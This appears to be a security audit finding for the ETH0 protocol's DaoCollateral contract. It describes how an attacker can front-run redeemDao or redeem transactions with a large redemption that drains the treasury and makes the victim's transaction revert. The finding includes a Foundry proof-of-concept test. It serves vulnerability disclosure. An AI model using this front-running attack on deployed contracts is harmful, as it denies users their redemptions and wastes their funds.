# Front-running leads to DoS on `redeemDao` (or `redeem()`) since there is not upper bound check on redemptions

### Summary

There is no upper bound check in `redeem()`, which means an attacker can front-run `redeemDao()` or `redeem()` tx's by a large redemption to cause it to revert.

### Root Cause

In [`daoCollateral::redeem()`](https://github.com/sherlock-audit/2025-05-usual-eth0/blob/main/eth0-protocol/src/daoCollateral/DaoCollateral.sol#L548), there is no check to prevent users from taking huge redemptions, even tho [there is a maximum amount check on swaps](https://github.com/sherlock-audit/2025-05-usual-eth0/blob/main/eth0-protocol/src/daoCollateral/DaoCollateral.sol#L347).

ETH0 can be minted using multiple collateral tokens, and redemptions happen in only one token, so the totalSupply of ETH0 will always be larger than the treasury's balance of a certain collateral token.

This makes it possible for attackers holding enough ETH0 to monitor the mempool for `redeemDao` or `redeem` tx's, front-run it with a redemption with the same collateral token as the victim's, lowering the balance of the treasury of that particular token to less than the amount the victim is willing to redeem, causing the tx to revert.

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

1. Victim calls `redeemDao` or `redeem`.
2. Attacker notices the tx mempool, he frontruns it with a `redeem` tx to lower the balance of the treasury of that token to less than what's the victim is willing to redeem.
3. The victim's tx will revert due to insufficient balance.

### Impact

- Causing victim's tx's to revert without achieving their intended action, costing them gas.
- Preventing users from redeeming their ETH0 tokens for a certain token, which can lock their collateral indefinitely.

### PoC

1. Add the following test to `./test/DaoCollateral.t.sol` : 
```solidity
    function test_FrontrunningToDoSRedeemDao() external {
        address attacker = makeAddr("attacker");
        (address wseth, Eth0 eth0Token) = setupCreationRwaLido();
        deal(address(wseth), daoredeemer, 10e18);

        vm.startPrank(daoredeemer);
        Eth0(address(wseth)).approve(address(daoCollateral), 10e18);
        daoCollateral.swap(address(wseth), 10e18, 0);
        vm.stopPrank();

        deal(address(eth0Token), attacker, 10e18);
        // vm.startPrank(daoredeemer);
        // daoCollateral.redeemDao(address(wseth), 10e18);  // Victim tries to redeem, but the tx in pending in the mempool
        // vm.stopPrank();

        // The attacker notices the tx in the mempool, and front-runs it with a redeem to drain the balance of the treasury
        vm.startPrank(attacker);
        daoCollateral.redeem(address(wseth), 10e18,0);
        vm.stopPrank();

        // The victim's tx will revert
        vm.startPrank(daoredeemer);
        vm.expectRevert();
        daoCollateral.redeemDao(address(wseth), 10e18);  // Victim tries to redeem, but the tx in pending in the mempool
        vm.stopPrank();
    }
```
2. Run the command `forge test --mt test_FrontrunningToDoSRedeemDao -vvvv`
